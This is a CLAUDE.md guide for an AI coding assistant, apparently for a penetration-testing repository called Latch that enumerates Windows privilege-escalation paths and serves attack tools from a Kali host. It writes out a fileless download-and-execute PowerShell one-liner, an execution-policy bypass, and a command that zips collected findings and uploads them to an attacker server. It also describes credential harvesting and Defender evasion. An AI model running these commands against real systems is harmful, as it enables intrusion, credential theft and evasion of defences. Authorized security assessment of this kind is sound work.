# CLAUDE.md

This file provides guidance to Claude Code (claude.ai/code) when working with code in this repository.

## Project Overview

**Latch** is a Windows Privilege Escalation Enumeration Toolkit for authorized security assessments. It has two main components:
- `Latch.ps1` - PowerShell enumeration script for Windows targets
- `serve-tools.sh` - Bash tool server for hosting privesc tools from a Kali/attack host

## Running the Scripts

### Tool Server (Kali/Attack Host)
```bash
./serve-tools.sh --download           # Search /opt, download missing tools, serve on port 80
./serve-tools.sh -s /tools -p 8080    # Custom search dir and port
./serve-tools.sh --download-only      # Download tools without starting server
```

### Latch Script (Windows Target)
```powershell
powershell -ep bypass -c ".\Latch.ps1"
powershell -ep bypass -c ".\Latch.ps1 -RemoteHost 10.10.14.5 -DownloadTools -Zip -Upload http://KALI:8000/upload -Cleanup"

# In-memory execution (fileless)
powershell -ep bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://KALI_IP/Latch.ps1')"
```

## Architecture

### Latch.ps1 Structure (16 enumeration steps)
1. System info (user, groups, privileges, local accounts)
2. Network (IP, ports, connections, routing, firewall)
3. Installed patches
4. Quick wins (PS history, saved creds, autologon)
5. Unattend files (sysprep passwords)
6. Web configs (IIS, .NET)
7. All services + unquoted path detection
8. Non-standard services only
9. Scheduled tasks (privileged + all)
10. Autoruns
11. AlwaysInstallElevated check
12. Installed software
13. Running processes
14. DLL hijack (writable PATH dirs)
15. Directory tree (Users, Program Files, InetPub)
16. Zip & upload

**Critical Alert Files** - Created when high-risk findings detected:
- `TOKEN_PRIVS_FOUND.txt` - SeImpersonate/SeAssignPrimaryToken
- `MSI_ELEVATED_FOUND.txt` - AlwaysInstallElevated enabled
- `UNQUOTED_PATHS_FOUND.txt` - Exploitable service paths

**Helper Functions**:
- `Write-Status` - Unified logging (INFO/SUCCESS/WARNING/ERROR/CRITICAL)
- `Step` - Progress tracking
- `Test-IsAdmin` / `Test-IsDomainJoined` - Environment detection

### serve-tools.sh Structure
- Uses associative array `TOOLS[name]="patterns|download_url|post_process|folder"` for 74 tool definitions
- Categories: Enumeration, Credentials, Token Abuse, Tunneling, AD Tools
- Creates flat `all/` directory with symlinks for easy wget access
- Copies Latch.ps1 to serve directory automatically

## Key Design Patterns

- **Defender evasion**: String concatenation, `$ErrorActionPreference = "SilentlyContinue"`
- **Progress tracking**: Real-time percentage and timestamped colored output
- **Modular output**: Separate files per enumeration category
- **Tool integration**: Latch.ps1 can download tools from serve-tools.sh server

## No Build/Test Infrastructure

This project consists of standalone scripts with no:
- Package managers or dependencies
- Build process
- Test suite
- CI/CD pipeline

Scripts are directly executable - just ensure PowerShell 2.0+ (Windows) or Bash 4.0+ (Linux).
